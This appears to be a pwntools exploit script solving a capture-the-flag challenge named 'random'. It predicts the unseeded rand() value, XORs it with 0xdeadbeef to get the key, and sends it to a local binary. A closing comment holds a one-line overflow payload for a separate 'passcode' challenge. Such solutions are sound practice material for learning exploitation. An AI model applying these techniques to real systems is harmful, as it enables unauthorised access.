from pwn import *

exe = './random'
elf = ELF(exe, checksec=True)
context.log_level = 'info'
io = process(exe)

# https://stackoverflow.com/questions/28254928/first-call-of-rand-without-seed-same-number#:~:text=If%20no%20seed%20value%20is,and%20thus%20yield%20different%20sequences.
# https://stackoverflow.com/questions/14251452/if-i-dont-specify-srand-what-seed-does-rand-use
# tldr; if no seed, automatically seed with 1 
# running with online compiler shows first
# value with srand 1 is 1804289383

key = 0xdeadbeef ^ 0x6b8b4567
info('key: %d', key)
info('double check key ^ 83: %#x', key ^ 83)

io.sendline(str(key).encode())
io.interactive()

# remote :
# python -c "print 'a'*96 + '\x00\xa0\x04\x08' + '134514147'" | ./passcode

